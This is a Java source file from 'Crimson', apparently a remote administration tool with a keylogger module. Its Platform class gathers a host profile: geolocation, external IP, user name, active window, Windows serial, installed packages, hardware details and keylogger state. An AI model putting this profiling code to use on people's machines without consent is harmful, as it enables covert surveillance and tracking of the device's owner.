/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/

package com.subterranean_security.crimson.core.platform;

import com.subterranean_security.crimson.client.Client;
import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.Common.Instance;
import com.subterranean_security.crimson.core.platform.info.CPU;
import com.subterranean_security.crimson.core.platform.info.DISP;
import com.subterranean_security.crimson.core.platform.info.IPLocation;
import com.subterranean_security.crimson.core.platform.info.Java;
import com.subterranean_security.crimson.core.platform.info.Linux;
import com.subterranean_security.crimson.core.platform.info.Mobo;
import com.subterranean_security.crimson.core.platform.info.Net;
import com.subterranean_security.crimson.core.platform.info.OS;
import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
import com.subterranean_security.crimson.core.platform.info.RAM;
import com.subterranean_security.crimson.core.platform.info.User;
import com.subterranean_security.crimson.core.platform.info.WIN;
import com.subterranean_security.crimson.core.profile.SimpleAttribute;
import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
import com.subterranean_security.crimson.core.proto.Keylogger.State;

public final class Platform {

	private Platform() {
	}

	public static final ARCH javaArch = Java.getARCH();
	public static final OSFAMILY osFamily = OS.getFamily();

	public enum ARCH {
		X86, X64, SPARC, UNSUPPORTED;
		@Override
		public String toString() {
			return super.toString().toLowerCase();
		}
	}

	/**
	 * First Info Gather
	 */
	public static EV_ProfileDelta fig() {

		EV_ProfileDelta.Builder info = EV_ProfileDelta.newBuilder();

		try {
			info.setCvid(Common.cvid);
		} catch (Exception e1) {
			// TODO handle
			info.setCvid(0);
		}

		info.setFig(true);

		info.putStrAttr(SimpleAttribute.CLIENT_VERSION.ordinal(), Common.version);

		for (SimpleAttribute sa : SimpleAttribute.values()) {

			if (!sa.valid(osFamily)) {
				continue;
			}
			if (sa == SimpleAttribute.NET_EXTERNALIP && !Client.ic.getAllowMiscConnections()) {
				continue;
			}
			String value = queryAttribute(sa);
			if (value != null) {
				info.putStrAttr(sa.ordinal(), value);
			}

		}

		info.addAllGroupAttr(CPU.getAttributes());
		info.addAllGroupAttr(DISP.getAttributes());

		if (Common.instance == Instance.CLIENT) {
			info.setKeyloggerState(Keylogger.isLogging() ? State.ONLINE : State.OFFLINE);
			info.setFlushMethod(Client.ic.getKeyloggerFlushMethod());
			info.setFlushValue(Client.ic.getKeyloggerFlushValue());
		}

		return info.build();
	}

	public static String queryAttribute(SimpleAttribute sa) {
		switch (sa) {
		case CLIENT_CID:
			return "" + Common.cvid;
		case CLIENT_CPU_USAGE:
			return CPU.getClientUsage();
		case CLIENT_ONLINE:
			return "1";
		case CLIENT_RAM_USAGE:
			return RAM.getClientUsage();
		case CLIENT_VERSION:
			return Common.version;
		case IPLOC_CITY:
			return IPLocation.getCity();
		case IPLOC_COUNTRY:
			return IPLocation.getCountry();
		case IPLOC_COUNTRYCODE:
			return IPLocation.getCountryCode();
		case IPLOC_LATITUDE:
			return IPLocation.getLatitude();
		case IPLOC_LONGITUDE:
			return IPLocation.getLongitude();
		case IPLOC_REGION:
			return IPLocation.getRegion();
		case JAVA_ARCH:
			return Java.getArch();
		case JAVA_PATH:
			return Java.getHome();
		case JAVA_START_TIME:
			return Java.getStartTime();
		case JAVA_VENDOR:
			return Java.getVendor();
		case JAVA_VERSION:
			return Java.getVersion();
		case LINUX_DISTRO:
			return Linux.getDistro();
		case LINUX_KERNEL:
			return Linux.getKernel();
		case LINUX_PACKAGES:
			return Linux.getPackages();
		case LINUX_SHELL:
			return Linux.getShell();
		case LINUX_TERMINAL:
			return Linux.getTerminal();
		case LINUX_WM:
			return Linux.getWM();
		case META_FIRST_CONTACT:
			break;
		case MOBO_MANUFACTURER:
			return Mobo.getManufacturer();
		case MOBO_MODEL:
			return Mobo.getModel();
		case NET_DNS1:
			return Net.getDNS1();
		case NET_DNS2:
			return Net.getDNS2();
		case NET_EXTERNALIP:
			return Net.getExternalIP();
		case NET_FQDN:
			return Net.getFQDN();
		case NET_DEFAULT_GATEWAY:
			return Net.getDefaultGateway();
		case NET_HOSTNAME:
			return Net.getHostname();
		case OS_ACTIVE_WINDOW:
			return OS.getActiveWindow();
		case OS_ARCH:
			return OS.getArch();
		case OS_FAMILY:
			return osFamily.toString();
		case OS_LANGUAGE:
			return OS.getLanguage();
		case OS_NAME:
			return OS.getName();
		case OS_TIMEZONE:
			return OS.getTimezone();
		case OS_START_TIME:
			return OS.getStartTime();
		case OS_VIRTUALIZATION:
			return OS.getVirtualization();
		case OS_ENDIAN:
			return OS.getEndian();
		case RAM_FREQUENCY:
			return RAM.getFrequency();
		case RAM_SIZE:
			return RAM.getSize();
		case RAM_TEMP:
			return RAM.getTemperature();
		case RAM_USAGE:
			return RAM.getUsage();
		case USER_HOME:
			return User.getHome();
		case USER_NAME:
			return User.getName();
		case USER_STATUS:
			return User.getStatus();
		case WIN_IE_VERSION:
			return WIN.getIEVersion();
		case WIN_INSTALLDATE:
			return WIN.getInstallTime();
		case WIN_POWERSHELL_VERSION:
			return WIN.getPowerShellVersion();
		case WIN_SERIAL:
			return WIN.getSerial();
		default:
			break;

		}
		return "";
	}

}
